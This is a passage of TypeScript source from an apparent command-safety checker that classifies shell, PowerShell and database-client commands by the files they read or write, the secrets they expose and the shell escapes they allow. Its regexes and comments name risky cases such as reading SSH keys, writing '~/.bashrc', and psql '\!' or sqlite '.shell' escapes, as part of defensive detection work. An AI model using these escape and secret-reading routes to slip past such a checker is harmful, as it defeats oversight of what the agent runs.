    const root = env.flavour === "posix" ? abs === "/" : /^[A-Za-z]:\\?$/.test(abs);
    const what = sc.home && isUnder(abs, sc.home, env) && isUnder(sc.home, abs, env) ? "your home folder"
      : root || (sc.home && isUnder(sc.home, abs, env)) ? "a folder that holds your home folder"
      : holdsEmberPath(abs, env) ? "a folder that holds Ember's own files" : null;
    if (what === null) continue;
    h.e.unclear("unclear.broad-folder", `Ember can't tell what ${h.prog} does with ${what}.`);
    return;
  }
}

/** Programs whose arguments name files on another computer or in a container, not here (their own rows judge them). */
const ELSEWHERE_ARGS = new Set(["ssh", "slogin", "autossh", "mosh", "docker", "podman", "nerdctl", "docker-compose", "podman-compose", "kubectl"]);
/** Long options whose value names a file the program reads: `--file`, `--input-file`, `--pathspec-from-file`, `--files0-from`. */
const FILE_OPTION = /(file|files|.-from)$/;
/** Long options whose value is a file the program writes or a folder it writes into: `--output`, `--outdir`, `--directory-prefix`. */
const OUTPUT_OPTION = /^(out|output)(-?(file|dir|directory))?$|^(outdir|outfile|directory-prefix|pack-destination)$/;
/** Known programs whose `-o` names their output (to the others, `nm -o`, `strings -o`, `od -o`, it is a flag or a format). */
const OUTPUT_O = new Set(["gcc", "g++", "cc", "c++", "clang", "clang++", "ld", "as", "rustc", "strip", "pandoc"]);
/**
 * Options naming a settings file the program loads without showing it: MySQL's option files, which keep the password
 * off the command line (review #174). --print-defaults and my_print_defaults print what they hold.
 */
const SETTINGS_FILE_OPTION = new Set(["defaults-file", "defaults-extra-file"]);

/**
 * Every program's long options whose value names a file it reads or writes, judged after its own row (which may never
 * look at them). One it reads (`du --files0-from=…`, `git add --pathspec-from-file …`, `date --file=…` show its lines
 * in their errors) meets the secret and Ember rules as `cat`'s file does (review #174); one it writes, or a folder it
 * writes into (`--output`, `npm pack --pack-destination`, an unknown program's `-o`: `gcc -o ~/.bashrc`), meets the
 * start-up, autostart, system and Ember rules too (review #169). Text programs' words and the arguments of programs
 * that name files elsewhere (another computer, a container) are left out.
 */
function optionPaths(h: H, unknown: boolean): void {
  if (TEXT.has(h.key) || ELSEWHERE_ARGS.has(h.key)) return;
  const args = h.args;
  for (let k = 0; k < args.length; k++) {
    const a = args[k];
    if (a.v === "--") return;
    // An unknown program's `-o` (PowerShell hands it over as a parameter, as written).
    const short = unknown && a.v === "-o" && (!KNOWN_ORDINARY.has(h.key) || OUTPUT_O.has(h.key));
    if (a.param !== undefined && !short) continue;
    // A word Ember can't see is still an option by its written name (`--file="$F"`): its value is unknown.
    const m = /^--([A-Za-z][A-Za-z0-9-]*)(=([\s\S]*))?$/.exec(a.v ?? a.raw);
    // An unknown program's one-letter option with a whole path attached (`-f/home/ana/.ssh/id_rsa`) reads it
    // (commands-classes-x9-9).
    const attached = unknown && a.v !== null ? /^-[A-Za-z]((?:\/|~\/)[\s\S]+)$/.exec(a.v) : null;
    if (attached) { h.e.usePath({ ...a, v: attached[1], param: undefined }, "read", h.sc); continue; }
    const name = m ? m[1].toLowerCase() : short ? "o" : null;
    if (name === null) continue;
    const output = name === "o" || OUTPUT_OPTION.test(name);
    if (!output && (!FILE_OPTION.test(name) || name.endsWith("profile"))) continue;
    if (SETTINGS_FILE_OPTION.has(name) && h.key !== "my_print_defaults" && !args.some(x => x.v === "--print-defaults")) continue;
    // `--file=x` in one word (its pattern, for a glob, is the part after `=`), or `--file x`.
    const value: Arg | undefined = m && m[2] !== undefined
      ? { ...a, v: a.v === null ? null : m[3], pattern: a.pattern === undefined ? undefined : a.pattern.slice(a.pattern.indexOf("=") + 1), param: undefined }
      : args[k + 1];
    if (value && value.v === null) { h.e.judgeUnseen(value, output ? "write" : "read", h.sc); h.e.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${h.prog || "the program"} gets.`); continue; }
    if (!value || value.v === null || value.v === "" || STDIN_NAME.test(value.v) || NULL_SINKS.has(value.v.toLowerCase()) || URL_LIKE.test(value.v)) continue;
    if (!output) { h.e.usePath(value, "read", h.sc); continue; }
    // An output option's value may be a format (`--output json`, `ps -o pid,comm`): only one that looks like a path.
    if (!/[~/\\.]/.test(value.v)) continue;
    // Only §3.6's rules: whether a script this command runs is one it writes is its own row's business (L8).
    const mark = h.e.written.length;
    const obj = h.e.usePath(value, "write", h.sc);
    if (obj.abs !== null && /(dir|directory|prefix|destination)$/.test(name)) h.e.judgeInside(obj.abs, "write", h.sc, value.v);
    h.e.written.length = mark;
  }
}

/** What a row's value option names: a file it reads or writes, a folder it writes into, or the folder its command runs in. */
type OptionFileUse = "read" | "write" | "into" | "cd";

/**
 * The files and folders a row's value options name (`--redirect-warnings f`, `-F f`, `--wd d`), judged as the bare path
 * is: an option an option table lists as taking a value takes the word after it, so that word is judged only where the
 * row reads it (commands-remote-v5-3). A value Ember can't see is judged by its parts, and asks unless `askUnseen` is
 * false.
 */
function optionFiles(h: H, args: readonly Arg[], p: Parsed, files: Partial<Record<OptionFileUse, readonly string[]>>, askUnseen = true): void {
  const mark = h.e.written.length;
  for (const use of ["read", "write", "into", "cd"] as const) {
    const names = files[use] ?? [];
    for (const o of p.opts) {
      if (o.value === undefined || !names.some(n => optIs(o.name, n))) continue;
      const v = o.value;
      if (v !== null && (v === "" || STDIN_NAME.test(v) || NULL_SINKS.has(v.toLowerCase()) || /^std(out|err)$/.test(v))) continue;
      // The word itself when the value came apart from the option, so a variable in it keeps its parts.
      const w = args[o.at]?.v ?? "";
      const next = args[o.at + 1];
      const apart = next !== undefined && next.v === v && (w === o.name || (!w.startsWith("--") && w.endsWith(o.name.slice(1))));
      // A value attached to it that Ember can't see all of (`--arg-file="$d/x"`) keeps its pieces (commands-remote-w5-6).
      const a: Arg = apart ? next : v === null ? { v: null, raw: "?", glob: false, ...(o.parts ? { parts: o.parts } : {}) } : lit(v);
      if (a.v === null && askUnseen) h.e.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${h.prog || "the program"} gets.`);
      const obj = h.e.usePath(a, use === "into" ? "write" : use, h.sc);
      if (use === "into" && obj.abs !== null) h.e.judgeInside(obj.abs, "write", h.sc, obj.text);
    }
  }
  h.e.written.length = mark;
}

/** PowerShell's approved verbs that change things: an unknown cmdlet with one is unclear (§3.4.2's conservative rule). */
const PS_READ_VERBS = new Set(["get", "find", "search", "select", "measure", "test", "compare", "convertto", "convertfrom", "format", "resolve", "trace", "join", "split", "group", "sort", "where", "foreach", "show", "read", "out", "write", "debug", "wait", "use", "watch", "confirm", "assert", "ping", "receive", "convert", "expand", "limit"]);
/**
 * The verbs of an unknown cmdlet that run with no question (commands-closed): PowerShell's verbs that only read, show,
 * measure or convert. One with another of PS_READ_VERBS (`Show-`, `Find-`, `Read-`, `Write-`, `Use-`, …) asks as a
 * program Ember doesn't know; one with a verb that changes something asks as before (unclear.cmdlet).
 */
const PS_ORDINARY_VERBS = new Set(["get", "test", "measure", "select", "where", "sort", "group", "format", "convertto", "convertfrom", "compare", "resolve", "split", "join"]);
/** Cmdlets with other verbs that only show progress, wait or search the gallery (commands-closed-y9-7). */
const PS_ORDINARY_CMDLETS = new Set(["write-progress", "wait-process", "find-module"]);
function unknownCmdlet(h: H): void {
  const verb = h.key.split("-")[0];
  if (!PS_READ_VERBS.has(verb)) h.e.unclear("unclear.cmdlet", `Ember can't tell what ${h.prog} changes.`);
  else if (!PS_ORDINARY_VERBS.has(verb) && !PS_ORDINARY_CMDLETS.has(h.key) && !h.e.readsAsMain) h.e.add("unknown", "unknown.program", SAYS.unknownProgram);
  // One whose noun names a secret, or that prints one as plain text, hands it to the output whatever its verb
  // (`Get-Secret`, `Get-AzKeyVaultSecret -AsPlainText`, `Get-AzStorageAccountKey`: commands-closed-y9-5).
  if (/secret|credential|token|passw(or)?d|apikey|vault|certificate|keys?$/.test(h.key.slice(verb.length + 1)) || h.args.some(a => /^-asplaintext\b/i.test(a.v ?? a.raw))) {
    h.e.add("secret", "secret.program", SAYS.secrets);
  }
  for (const a of h.args) if (a.v === null && a.raw.startsWith("{")) h.e.unclear("unclear.script-block", "It runs a script block Ember can't follow.");
  h.e.readArgs(h.args.filter(a => a.param === undefined && !(a.v ?? "").startsWith("-")), h.sc);
}

/** Text programs (their arguments aren't files). */
const TEXT = new Set([
  "echo", "printf", "true", "false", ":", "test", "[", "expr", "sleep", "seq", "yes", "cal", "whoami", "id", "uname", "pwd", "which",
  "whereis", "basename", "dirname", "let", "unset", "shift", "wait", "umask", "ulimit", "hash", "jobs", "fg", "getopts", "locale",
  "tput", "clear", "reset", "times", "logname", "users", "who", "w", "uptime", "nproc", "getconf", "sync", "tty", "factor", "numfmt",
  "exit", "return", "break", "continue", "type", "help", "dirs", "caller", "logout", "suspend", "arch", "local", "readonly",
  "write-output", "write-host", "start-sleep", "get-location", "get-date", "get-process", "get-service", "test-path", "get-command",
  "get-help", "get-history", "get-variable", "set-variable", "new-variable", "remove-variable", "clear-host", "get-host",
  "get-culture", "get-uiculture", "get-random", "get-unique", "get-member", "format-table", "format-list", "format-wide",
  "format-custom", "out-string", "out-null", "out-host", "out-default", "select-object", "sort-object", "group-object", "measure-object",
  "where-object", "foreach-object", "compare-object", "convertto-json", "convertfrom-json", "convertto-csv", "convertfrom-csv",
  "get-alias", "get-psdrive", "resolve-path", "convert-path", "split-path", "join-path", "get-job", "receive-job", "wait-job",
  "stop-job", "remove-job", "get-module", "exit", "chcp", "ver", "vol", "title", "cls", "verify", "break", "endlocal",
]);

// ------------------------------------------------------------------------------------------------------------------
// Native programs (every family): §3.5's rows.

reg(NATIVE, [...TEXT], h => { textProgram(h); });
// getopts sets its variables from the arguments the shell was given, which Ember can't see (commands-a7-2).
reg(NATIVE, ["getopts"], h => {
  textProgram(h);
  if (h.sc.family === "posix") h.e.unclear(...READ_TEXT);
});

reg(NATIVE, ["hostname"], h => {
  if (h.sc.os !== "win32" && h.args.some(a => a.v !== null && !a.v.startsWith("-"))) h.e.add("system", "system.kernel", "Changes how the system works.");
});
reg(NATIVE, ["date"], h => {
  if (h.args.some(a => a.v === "-s" || (a.v ?? "").startsWith("--set"))) h.e.add("system", "system.kernel", "Changes how the system works.");
  // GNU date -f reads dates from a file and shows each line it can't read in its error, so it reads that file like cat
  // (review #174). BSD date's -f is an input format.
  if (h.sc.os === "darwin") return;
  for (const f of values(opts(h, { shortValue: "dfrs", longValue: ["date", "file", "reference", "set"] }), "f", "file")) {
    if (f === null) h.e.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${h.prog} gets.`);
    else if (!STDIN_NAME.test(f)) h.e.usePath(lit(f), "read", h.sc);
  }
});

// cd and friends: the task's folder for what follows (§3.14).
reg(NATIVE, ["cd", "chdir", "pushd", "popd", "set-location", "push-location", "pop-location", "sl"], h => {
  if (h.key === "popd" || h.key === "pop-location") { h.e.cdTarget = null; return; }
  let target: Arg | undefined;
  if (h.sc.family === "powershell" && h.s.ps) {
    const b = bindPs(h, PS_CMDLETS["set-location"]);
    target = (b.named.get("Path") ?? b.named.get("LiteralPath") ?? [])[0];
  } else {
    // `--` ends a POSIX cd's or pushd's options: the folder is the word after it (`cd -- ~/.config/ember`), never `--`
    // itself (commands-a7-4).
    const dd = h.sc.family === "cmd" ? -1 : h.args.findIndex(a => a.v === "--");
    const before = dd < 0 ? h.args : h.args.slice(0, dd);
    const ops = [...before.filter(a => !(a.v !== null && /^-[LPe@]+$/.test(a.v)) && !(h.sc.family === "cmd" && a.v?.toLowerCase() === "/d")), ...(dd < 0 ? [] : h.args.slice(dd + 1))];
    target = ops[0];
    if (ops.length > 1 && h.sc.family === "cmd") target = { ...ops[0], v: ops.map(o => o.v).join(" ") };
  }
  if (h.sc.family === "posix" && physicalCd(h.args)) {
    // `cd -P` lands in the folder's real path, which only the target knows (the second pass), and every name after it
    // would be judged there, where the first pass never probed (a link inside it into ~/.ssh, unseen), and its `cd ..`
    // leaves from there: what follows it in this command has no folder Ember knows (a relative name asks). A command
    // that is only `cd -P <folder>` still moves the task's folder, by the name as written (the same folder; the next
    // command's shell gets that name in PWD, so its `cd ..` matches), unless a `..` in it only the target could resolve.
    const abs = !target ? h.sc.home : target.v === "-" ? null : h.e.usePath(target, "cd", h.sc).abs;
    const dots = target?.v != null && physicalForm(target.v, { os: h.sc.os === "win32" ? "linux" : h.sc.os, home: h.sc.home ?? "", cwd: h.sc.cwd ?? "" }) !== null;
    h.e.cdTarget = null;
    finishCd(h, dots ? null : abs);
    return;
  }
  if (!target) { h.e.cdTarget = h.sc.home; finishCd(h, h.sc.home); return; }
  if (target.v === "-") { h.e.cdTarget = null; return; }
  const obj = h.e.usePath(target, "cd", h.sc);
  h.e.cdTarget = obj.abs;
  finishCd(h, obj.abs);
});
/** Whether a POSIX `cd` follows links (`cd -P`; the last of -L and -P wins), so it lands in a real path. */
function physicalCd(args: readonly Arg[]): boolean {
  let physical = false;
  for (const a of args) {
    if (a.v === "--") break;
    if (a.v === null || !/^-[LPe@]+$/.test(a.v)) continue;
    for (const c of a.v.slice(1)) if (c === "P") physical = true; else if (c === "L") physical = false;
  }
  return physical;
}
/**
 * A shell option name that can make every later `cd` follow links (bash's physical, zsh's chase_links and chase_dots),
 * either way round (zsh's `no` prefix turns a name over: `unsetopt no_chase_links` sets it), or one Ember can't see.
 */
const chaseOption = (name: string | null): boolean => name === null || /^(no)?(physical|chaselinks|chasedots)$/.test(name.toLowerCase().replace(/[_-]/g, ""));
const CHASE_SAYS = "It makes the shell follow links when it changes folder, which Ember doesn't follow.";
/** zsh's CDABLE_VARS by name, either way round. */
const cdableOption = (name: string): boolean => /^(no)?cdablevars$/.test(name.toLowerCase().replace(/[_-]/g, ""));
const CDABLE_SAYS = "It makes cd go to folders named by variables, which Ember doesn't follow.";
/**
 * Whether a POSIX `set` may make every later `cd` follow links: bash's `-P`, zsh's `-w` (CHASE_LINKS's letter), an
 * option name chaseOption matches after `-o` or `+o` (every `o` in a cluster takes the next word: `set -euo physical`,
 * `set -oe physical`), or a word Ember can't see (it could be any of these). Only the words before `--`.
 */
function setChases(args: readonly Arg[]): boolean {
  for (let k = 0; k < args.length; k++) {
    const v = args[k].v;
    if (v === null) return true;
    if (v === "--") return false;
    const m = /^([-+])([A-Za-z]+)$/.exec(v);
    if (!m) continue;
    if (m[1] === "-" && /[Pw]/.test(m[2])) return true;
    for (const c of m[2]) {
      if (c !== "o") continue;
      k++;
      if (k < args.length && chaseOption(args[k].v)) return true;
    }
  }
  return false;
}
function finishCd(h: H, abs: string | null): void {
  if (h.sc.depth === 0 && h.sc.wrappers.length === 0 && h.e.commands.length === 1) h.e.topCd = { at: h.e.at, abs };
}

// Listing names and sizes reads no file's contents.
reg(NATIVE, ["ls", "ll", "dir", "vdir", "tree", "du", "stat", "file", "lsd", "exa", "eza"], h => {
  // stat's -f (file system), file's -w and exa's -T (tree) take no value, and --color (and du's --time) one only after =
  // (commands-remote-i5a); lsd's -L (follow links) and -t (sort by time) are switches (commands-remote-v5-5).
  const short: Readonly<Record<string, string>> = { tree: "LPIoHT", du: "BdXt", stat: "c", file: "eFfmP", lsd: "I", exa: "LIstw", eza: "LIstw" };
  // Main's table was one for all of them but tree, du and stat, gave --color and --time the next word and knew no --cached,
  // --charset, --filelimit or --timefmt, so the word after one was a file to list: judged that way too (commands-held-8).
  const p = heldOpts(h, { shortValue: short[h.key] ?? "IwT", longValue: ["ignore", "hide", "format", "time-style", "width", "tabsize", "block-size", "exclude", "max-depth", "threshold", "printf", "output", "sort", "indicator-style", "quoting-style", "files0-from", "exclude-from", "cached", "filelimit", "timefmt", "charset"], longOptional: ["color", "time"] }, { shortValue: h.key === "tree" ? "LPIoH" : h.key === "du" ? "BdXt" : h.key === "stat" ? "cf" : "IwT", longValue: ["ignore", "hide", "format", "time-style", "width", "tabsize", "block-size", "exclude", "max-depth", "threshold", "time", "printf", "output", "sort", "color", "indicator-style", "quoting-style", "files0-from", "exclude-from"] });
  if (h.key === "tree") for (const o of values(p, "o", "output")) if (o) h.e.usePath(lit(o), "write", h.sc);
  // file's -f reads the names to look at from a file and prints each, and -m loads magic files (commands-remote-v5-3).
  if (h.key === "file") optionFiles(h, h.args, p, { read: ["f", "m"] });
  // du reads names from --files0-from and patterns from -X/--exclude-from, and shows the lines in its errors (review
  // #174): those files are read. `--exclude` is a pattern, not an abbreviation of --exclude-from.
  if (h.key === "du") {
    for (const o of p.opts) {
      const named = o.name === "-X" || (o.name.startsWith("--files0") && "--files0-from".startsWith(o.name)) || (o.name.startsWith("--exclude-") && "--exclude-from".startsWith(o.name));
      if (named && o.value !== undefined && o.value !== null && !STDIN_NAME.test(o.value)) h.e.usePath(lit(o.value), "read", h.sc);
    }
  }
  // tree --fromfile reads each file it is given as a listing and prints its lines.
  const use: PathUse = h.key === "tree" && has(p, "fromfile") ? "read" : "list";
  for (const a of p.operands) {
    if (a.v === null) { h.e.judgeUnseen(a, use, h.sc); h.e.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${h.prog} gets.`); continue; }
    const obj = h.e.usePath(a, use, h.sc);
    if (obj.abs === null) h.e.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${h.prog} gets.`);
  }
});
// grep and friends: a recursive search reads every file under its folders (secrets included unless hidden files are skipped).
reg(NATIVE, ["grep", "egrep", "fgrep", "rg", "ag", "ack", "ugrep", "git-grep"], h => {
  // git grep's and ugrep's pager value is optional and only follows `=`: written alone, the option takes the default
  // pager and the next word is the pattern or a file (review #165). ag's and ack's take the next word.
  const pagerApart = h.key === "git-grep" || h.key === "ugrep" ? [] : ["pager", "open-files-in-pager"];
  // GNU grep's, ugrep's and git grep's --color take a value only after =, and ag's and ack's none: only rg's takes the next
  // word, as rg's -d and -r do. ag's -f and -D and ack's -f are switches (commands-remote-i5a).
  const short: Readonly<Record<string, string>> = { rg: "eftgjmABCEMTdr", ag: "ABCGgmp", ack: "ABCmg" };
  // ag's and ack's own long options that take a value: to GNU grep `--ignore` is --ignore-case, and to rg a switch
  // (commands-remote-v5-5).
  const long: Readonly<Record<string, readonly string[]>> = { ag: ["file-search-regex", "depth", "path-to-ignore", "ignore", "ignore-dir"], ack: ["ignore-dir", "match", "output", "files-from"] };
  // Main's table was GNU grep's for all but rg, with --color taking the next word and none of ag's or ack's own, so other
  // words were the files searched: judged that way too (commands-held-8).
  const p = heldOpts(h, { shortValue: short[h.key] ?? "efmABCdD", longValue: ["regexp", "file", "max-count", "after-context", "before-context", "context", "include", "exclude", "exclude-dir", "include-dir", "directories", "devices", "label", "binary-files", ...(h.key === "rg" ? ["color", "colors"] : []), "group-separator", "glob", "iglob", "type", "type-not", "type-add", "max-depth", "threads", "encoding", "max-filesize", "sort", "sortr", "path-separator", "pre", "pre-glob", "engine", "ignore-file", "replace", ...pagerApart, "filter", "hostname-bin", ...(long[h.key] ?? []), "context-separator", "field-context-separator", "field-match-separator", "max-columns", "dfa-size-limit", "regex-size-limit"], longOptional: ["color", "colour"] }, { shortValue: h.key === "rg" ? "eftgjmABCEMT" : "efmABCdD", longValue: ["regexp", "file", "max-count", "after-context", "before-context", "context", "include", "exclude", "exclude-dir", "include-dir", "directories", "devices", "label", "binary-files", "color", "colour", "glob", "iglob", "type", "type-not", "type-add", "max-depth", "threads", "encoding", "max-filesize", "sort", "sortr", "path-separator", "pre", "pre-glob", "engine", "ignore-file", "replace", ...pagerApart, "filter", "hostname-bin"] });
  // Options whose value is a program run on the matches or the matched files (review #165): git grep's pager,
  // ag/ack/ugrep's pager, ugrep's per-file filter, rg's --pre and --hostname-bin. Seen text is the command it runs.
  if (values(p, "pre", "hostname-bin").length) h.e.unclear("unclear.rg-pre", "It runs a program on every file Ember can't see.");
  const pagerCmds = [...values(p, "pager", "open-files-in-pager"), ...values(p, "filter")];
  if (h.key === "git-grep" && p.opts.some(o => o.value === undefined && optIs(o.name, "open-files-in-pager"))) pagerCmds.push(null);
  // git grep's -O takes the rest of its word as the pager, after any flags bundled before it (`-nOcmd`); a bundle with
  // a value option before it (-e, -f, -m, -A, -B, -C) gives that option the rest instead.
  if (h.key === "git-grep") for (const a of h.args) { const m = /^-([A-Za-z0-9]*?)O(.*)$/.exec(a.v ?? ""); if (m && !/[efmABC]/.test(m[1])) pagerCmds.push(m[2] || null); }
  for (const cmd of pagerCmds) {
    if (cmd === null) { h.e.unclear("unclear.rg-pre", "It runs a program on every file Ember can't see."); continue; }
    // ugrep's filter is `glob:command,glob:command`; the pager options are a plain command line.
    const text = h.key === "ugrep" && /^[^:,]*:/.test(cmd) ? cmd.split(",").map(part => part.replace(/^[^:]*:/, "")).join("; ") : cmd;
    h.e.nested(text, "sh", h.sc, `${h.prog} pager`);
  }
  // ack's --match gives the pattern as -e does: every operand is then a file.
  const patternGiven = values(p, "e", "regexp", "f", "file", ...(h.key === "ack" ? ["match"] : [])).length > 0;
  for (const f of values(p, "f", "file")) if (f) h.e.usePath(lit(f), "read", h.sc);
  const files = patternGiven ? p.operands : p.operands.slice(1);
  const hiddenToo = h.key === "grep" || h.key === "egrep" || h.key === "fgrep" || h.key === "ack" || h.key === "ugrep" || has(p, "hidden", "u", "uu", "uuu", "unrestricted", "a", "all-types", "no-ignore");
  const recursive = h.key === "rg" || h.key === "ag" || h.key === "ack" || has(p, "r", "R", "recursive", "dereference-recursive") || values(p, "d", "directories").includes("recurse");
  const use: PathUse = recursive && hiddenToo ? "readTree" : "read";
  for (const f of files) {
    if (f.v === null) { h.e.judgeUnseen(f, use, h.sc); h.e.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${h.prog} gets.`); continue; }
    const obj = h.e.usePath(f, use, h.sc);
    if (obj.abs === null) h.e.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${h.prog} gets.`);
  }
  if (recursive && hiddenToo && files.length === 0 && h.sc.cwd) h.e.usePath(lit("."), "readTree", h.sc);
});
reg(NATIVE, ["mysql", "mariadb", "mysqldump", "mysqladmin", "mysqlimport"], h => {
  if (h.args.some(a => a.v !== null && /^-p.+/.test(a.v))) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
  if (h.key === "mysql" || h.key === "mariadb") {
    interactive(h);
    databaseText(h, [...inlineSql(h, ["e"], ["execute"]), ...clusterSql(h, "e")], "mysql");
    // SQL read from stdin or a here-document (`mysql <<< 'system id'`): judge the seen text, else ask (review #166).
    if (!inlineSql(h, ["e"], ["execute"]).length) sqlFromStdin(h, "mysql");
    // The file --tee copies everything to, the program --pager shows results through, the SQL --init-command runs
    // first and the folder client plugins load from (commands-remote-c7-1).
    const p = opts(h, { shortValue: "hPuDeS", shortOptional: "p", longValue: MYSQL_VALUES, longOptional: ["password", "pager"] });
    for (const o of p.opts) {
      if (o.value === undefined) continue;
      const a: Arg = o.value === null ? { v: null, raw: "?", glob: false, ...(o.parts ? { parts: o.parts } : {}) } : lit(o.value);
      if (optIs(o.name, "tee")) h.e.usePath(a, "write", h.sc);
      else if (optIs(o.name, "init-command")) databaseText(h, [o.value], "mysql");
      else if (optIs(o.name, "pager")) clientShell(h, o.value);
      else if (optIs(o.name, "plugin-dir")) { h.e.usePath(a, "read", h.sc); h.e.unclear("unclear.sql", "It loads client plugins from a folder Ember doesn't read."); }
    }
  }
  if (h.key === "mysqladmin" && h.args.some(a => /^(drop|shutdown|flush-|kill|password|reload|refresh)/.test(a.v ?? ""))) h.e.add("destroy", "db.change", "Changes or deletes data in a database.");
  for (const r of h.args) if (r.v && /^--result-file=/.test(r.v)) h.e.usePath(lit(r.v.slice(14)), "write", h.sc);
});

/** mysql's long options that take the next word (the ones a command line commonly carries). */
const MYSQL_VALUES = [
  "host", "port", "user", "database", "execute", "socket", "tee", "init-command", "defaults-file", "defaults-extra-file", "defaults-group-suffix", "default-character-set",
  "plugin-dir", "ssl-ca", "ssl-capath", "ssl-cert", "ssl-key", "ssl-mode", "protocol", "delimiter", "login-path", "connect-timeout", "max-allowed-packet", "prompt",
];

/** Statements that change or delete what a database holds (D4.3 a: destroying data). */
const SQL_WRITE = /\b(drop|delete|truncate|update|alter|insert|replace|merge|upsert|grant|revoke|create|rename|vacuum|reindex|attach|detach|flushall|flushdb|dropdatabase|deletemany|deleteone|remove|load\s+data)\b|\binto\s+(out|dump)file\b/i;
/** Client commands that run programs, write or read files, or load code (psql's `\!`, sqlite's `.shell`, COPY … PROGRAM). */
const SQL_ESCAPE = /(^|[\s;])(\\(!|(o|g|gx|w|copy|i|ir|include|setenv|lo_export|lo_import|s)\b)|\.(shell|system|output|once|import|load|read|save|backup|restore|excel|open|cd|log|dump)\b|system\s)|\bprogram\s+'|\bcopy\b[^;]*\b(to|from)\b/i;

/** The SQL (or client commands) given on a database client's command line. */
/**
 * The word after a cluster of short options that ends in the client's text option (`psql -Atc '…'`, `mysql -Ne '…'`):
 * judged as its text as well, which only adds findings (commands-remote-y7-5).
 */
function clusterSql(h: H, letter: string): (string | null)[] {
  const cluster = new RegExp(`^-[A-Za-z]+${letter}$`);
  return h.args.flatMap((a, j) => (a.v !== null && cluster.test(a.v) && j + 1 < h.args.length ? [h.args[j + 1].v] : []));
}

function inlineSql(h: H, short: string[], long: string[]): (string | null)[] {
  const out: (string | null)[] = [];
  for (let k = 0; k < h.args.length; k++) {
    const v = h.args[k].v;
    if (v === null) continue;
    for (const s of short) {
      if (v === `-${s}`) out.push(h.args[k + 1]?.v ?? null);
      else if (v.startsWith(`-${s}`) && v.length > 2 && !v.startsWith("--")) out.push(v.slice(2));
    }
    for (const l of long) {
      if (v === `--${l}`) out.push(h.args[k + 1]?.v ?? null);
      else if (v.startsWith(`--${l}=`)) out.push(v.slice(l.length + 3));
    }
  }
  return out;
}

/**
 * SQL a client reads from stdin: a here-document or another program's output is judged when seen, else asks (review
 * #166). A file redirect (`psql < dump.sql`) runs as `psql -f dump.sql` does (stdinFile).
 */
function sqlFromStdin(h: H, client?: SqlClient): void {
  if (h.s.stdin === "pipe" || h.s.stdin === "heredoc") fromStdin(h, t => databaseText(h, [t], client));
  else if (h.s.stdin === "file") stdinFile(h);
}

/**
 * A file a database client runs from its input (`psql app < drop_users.sql`, `redis-cli < cmds.txt`): judged by its
 * name, as `psql -f` is, and one this task downloaded asks (commands-remote-c5-3).
 */
function stdinFile(h: H): void {
  for (const r of h.s.redirs) {
    if (r.kind !== "read" || !r.target) continue;
    if (h.e.isDownloaded(r.target, h.sc)) h.e.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
    else if (r.target.v) nameCheck(h, r.target.v);
  }
}

/** redis-cli's commands that only read or watch (anything else changes the database). */
const REDIS_READS = /^(get|mget|exists|keys|scan|sscan|hscan|zscan|type|ttl|pttl|strlen|hget|hgetall|hkeys|hvals|hlen|hexists|lrange|llen|lindex|smembers|scard|sismember|zrange|zrangebyscore|zcard|zscore|info|ping|dbsize|time|echo|memory|object|client|slowlog|latency|monitor|subscribe|psubscribe|pubsub|xrange|xlen|xread|bitcount|getrange|getbit|role|lastsave|command|config)$/;
/**
 * One redis-cli command (its words, null for one Ember can't see): a change to the data, or to how the server works.
 * A command, or CONFIG's word after it, that Ember can't see asks, as psql -c's does (commands-remote-x6-5).
 */
function redisCommand(h: H, words: readonly (string | null)[]): void {
  if (words[0] === null || (/^config$/i.test(words[0] ?? "") && words[1] === null)) { h.e.unclear("unclear.sql", "It runs database commands Ember can't see."); return; }
  const cmd = (words[0] ?? "").toLowerCase();
  if (cmd && !REDIS_READS.test(cmd)) h.e.add("destroy", "db.change", "Changes or deletes data in a database.");
  if (cmd === "config" && /^(set|rewrite|resetstat)$/i.test(words[1] ?? "")) h.e.add("system", "system.kernel", "Changes how the system works.");
}

/** The clients whose own commands Ember reads (clientCommands): psql's `\x`, sqlite3's and duckdb's `.x`, mysql's words. */
type SqlClient = "psql" | "sqlite" | "mysql";

const SAYS_CLIENT = "It runs database client commands that can run programs or write files.";
/**
 * sqlite3's and duckdb's client commands that only show things or set how results look. Only written whole: sqlite3
 * takes any shortening (`.sh` is `.shell`, `.o` is `.output`), so every other word after a dot asks
 * (commands-remote-c7-1).
 */
const SQLITE_SHOWS = new Set([
  "bail", "binary", "changes", "columns", "databases", "dbinfo", "echo", "eqp", "exit", "explain", "fullschema", "header", "headers", "help", "indexes", "indices", "limit",
  "lint", "mode", "nullvalue", "print", "prompt", "quit", "schema", "separator", "show", "stats", "tables", "timeout", "timer", "version", "width",
]);
/** SQL functions of sqlite3's shell that read or write files, load code or open an editor. */
const SQLITE_FUNCTIONS = /\b(load_extension|writefile|readfile|edit|fts3_tokenizer)\s*\(/i;
/** psql's backslash commands that only describe, show or set how results look (`\dt+`, `\l`, `\x`, `\timing`). */
const PSQL_SHOWS = /^(d[A-Za-z]*\+?|l\+?|x|a|t|H|q|z|h|\?|timing|pset|echo|qecho|warn|conninfo|encoding|set|unset|C|f|T|sf\+?|sv\+?|errverbose|crosstabview|p|r|reset|print|if|elif|else|endif)$/;

/** A program a database client's own command or option runs through the shell (`.shell …`, `\! …`, `--pager=…`): judged as shell text. */
function clientShell(h: H, text: string | null): void {
  h.e.unclear("unclear.sql", SAYS_CLIENT);
  if (text === null || text.trim() !== "") h.e.payload([lit("sh"), lit("-c"), text === null ? { v: null, raw: "?", glob: false } : lit(text)], h.sc, h.prog || "sql");
}

/** The words after a client command that asks: a program after `|`, else files it may write, judged for Ember's own refusal. */
function clientWords(h: H, rest: string, use: PathUse = "write"): void {
  h.e.unclear("unclear.sql", SAYS_CLIENT);
  const t = rest.trim();
  if (t.startsWith("|")) { clientShell(h, t.slice(1)); return; }
  for (const w of t.split(/\s+/)) {
    const name = w.replace(/^['"]|['"];?$|;$/g, "");
    if (name !== "" && !name.startsWith("-")) h.e.usePath(lit(name), use, h.sc);
  }
}

/**
 * psql's backslash commands in its text, each with the words after it up to the line's end or the next backslash. psql
